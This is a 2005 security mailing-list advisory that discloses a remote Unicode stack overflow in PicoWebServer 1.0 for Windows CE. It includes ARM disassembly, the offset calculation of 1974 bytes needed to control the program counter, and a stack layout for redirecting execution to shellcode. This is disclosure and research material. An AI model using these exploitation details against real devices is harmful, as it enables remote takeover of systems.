@@ -1,0 +1,195 @@
+
+Date: Sat, 28 May 2005 18:13:03 +0200
+From: Dennis Elser <dennis@...ktrace.de>
+To: bugtraq@...urityfocus.com
+Subject: PicoWebServer Remote Unicode Stack Overflow
+
+
+                       
+            Title: PicoWebServer Remote Unicode Stack Overflow
+     Release Date: 28. May 2005
+           Author: Dennis Elser (dennis backtrace de)
+
+           Vendor: Newmad Technologies (http://www.newmad.se)
+    Vendor Status: Contacted
+          Product: PicoWebServer
+ Affected Version: 1.0
+ 
+         Platform: Microsoft Windows CE / PocketPC
+   Processor Type: ARM
+
+    Vulnerability: Missing user-input length check
+             Risk: High (Remote code execution)
+        Discovery: 23. May 2005
+           Impact: A remote attacker can gain full access to the device
+                   or crash the application
+
+
+--------------------------------------------------------------------------
+
+Background:
+-----------
+
+PicoWebServer is a free "light weight" HTTP web server for PocketPCs
+running the Windows CE operating system.
+By default, the PicoWebServer application is configured to listen for
+incoming connections on TCP port 80.
+
+
+
+Bug Description:
+----------------
+
+If the supplied URL is large enough, an attack can trigger a stack overflow
+and the application crashes. If successfully exploited, a remote 
+attacker can
+gain control over the device.
+
+
+
+Technical Description / Proof of Concept:
+-----------------------------------------
+
+An attacker gains control over the Program Counter (PC) by supplying
+an outsized HTTP GET request.
+
+
+1.) The maximum number of bytes that an attacker can supply is limited by
+a loop checking for the occurence of a "0D 0A 0D 0A" byte sequence.
+
+get_more_data_from_attacker:
+    ;snip
+
+    .text:00015664 SUB     R3, R8, R6                      ; R3 = 0x400 
+= 1024
+    .text:00015668 SUBS    R7, R3, #1                      ; R7 = 1023
+    .text:0001566C MOVMI   R7, R11
+    .text:00015670 MOV     R2, R7                          ; len = R7 = 
+R2 = 1023
+    .text:00015674 ADD     R1, R6, R4                      ; buf
+    .text:00015678 MOV     R0, R10                         ; s
+    .text:0001567C BL      _recv
+
+    ;snip
+                                                           ; check for \n\n
+    .text:00015704 MOV     R0, R4                          ; char * 
+0D,0A,0D,0A
+    .text:00015708 MOV     R1, R5                          ; char *
+    .text:0001570C BL      strstr
+    .text:00015710 MOVS    R3, R0
+    .text:00015714 BEQ     get_more_data_from_attacker
+
+
+If the above-mentioned byte sequence was found, the buffer might look 
+similar to this one:
+
+    GET /xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx[...snip...]\x0D\x0A\x0D\x0A
+
+
+2.) This buffer is then converted to unicode and passed to an unchecked
+swprintf() call, where the stack overflow occurs:
+
+    .text:00013738 ADD     R3, R4, #0xC                    ; 
+aGetXxxxxxxxxxxxxxxx
+                                                           ; snip
+    .text:00013774 ADD     R0, SP, #0x820+var_7EC          ; wchar_t 
+*destination
+    .text:00013778 LDR     R1, =aD_D_D_DDDDDDDS            ; wchar_t 
+*format_string
+                                                           ; 
+[%d.%d.%d.%d - %d/%d/%d@%d:%d:%d] "%s"
+                                                           ; snip
+    .text:00013798 BL      swprintf
+
+The call to swprintf() uses a stack variable (var_7EC) to store
+the resulting formatted string. It can hold a maximum number of 0x7EC 
+(2028) bytes.
+Once the string has been formatted and saved to the destination buffer,
+a possible result can be:
+
+    [127.0.0.1 - 2005/5/12@12:30:11] "GET /"
+
+The string is filled with an ip address, the current date and time and the
+GET request made by an attacker.
+In this example (depending on the ip, date, time and so on), an attacker 
+would have to
+supply 1974 additional bytes in order to take control over the Program 
+Counter.
+
+
+    sizes       |    description
+    ----------------------------
+        2028    |    size of var_7EC
+    -     82    |    size of unicode string: [127.0.0.1 - 
+2005/5/12@12:30:11] "GET /"
+    +      4    |    size of R4 (saved at function prologue)
+    +      4    |    size of R5 (saved at function prologue)
+    +      4    |    size of R6 (saved at function prologue)
+    +      4    |    size of R7 (saved at function prologue)
+    +      4    |    size of R8 (saved at function prologue)
+    +      4    |    size of R9 (saved at function prologue)
+    +      4    |    size of PC (saved at function prologue)
+    ---------------------------
+    =   1974         size of user-supplied buffer needed to overflow stack
+
+
+At the function epilogue of function sub_000136A4 the instruction at 
+address 0x000137D0
+modifies the stack pointer (SP) to point to offset 0x7D0 of the 
+formatted string
+containing user-supplied input (potential shellcode).
+The instruction at 0x000137D4 restores R4, R5, R6, R7, R8, R9 and PC 
+from the stack.
+
+    .text:000137D0 ADD     SP, SP, R12
+    .text:000137D4 LDMFD   SP!, {R4-R9,PC}
+
+Registers R4 to R9 and PC are under control of the attacker.
+
+
+    PicoWebServer.exe: The instruction at 0x780078 referenced memory at 
+0x780078.
+    The memory could not be read (0x00780078 -> 00780078)
+
+
+An attacker has full control over the device if he is able to let the 
+overwritten
+return address point to a "0D F0 A0 E1" ("MOV PC, SP") equivalent byte 
+sequence.
+Since SP is the only register pointing into the potential shellcode 
+supplied by an attacker,
+the aim of an attacker is to let PC equal SP.
+
+    stack:
+
+    debug1218:2211E90C 78 00 78 00 DCD 
+0x780078                            ; R4
+    debug1218:2211E910 78 00 78 00 DCD 
+0x780078                            ; R5
+    debug1218:2211E914 78 00 78 00 DCD 
+0x780078                            ; R6
+    debug1218:2211E918 78 00 78 00 DCD 
+0x780078                            ; R7
+    debug1218:2211E91C 78 00 78 00 DCD 
+0x780078                            ; R8
+    debug1218:2211E920 78 00 78 00 DCD 
+0x780078                            ; R9
+    debug1218:2211E924 04 00 07 00 DCD 
+addr_MOV_PC_SP                      ; PC
+    debug1218:2211E928             ; 
+-------------------------------------------------
+    debug1218:2211E928 78 00 78 00 RSBEQS  R0, R8, R8,ROR 
+R0               ; shellcode
+    debug1218:2211E92C 78 00 78 00 RSBEQS  R0, R8, R8,ROR R0
+    debug1218:2211E930 78 00 78 00 RSBEQS  R0, R8, R8,ROR R0
+    debug1218:2211E934 78 00 78 00 RSBEQS  R0, R8, R8,ROR R0
+    debug1218:2211E938 78 00 78 00 RSBEQS  R0, R8, R8,ROR R0
+
+
+
+
+--------------------------------------------------------------------------
+
+Dennis Elser, 28.05.2005
+
+
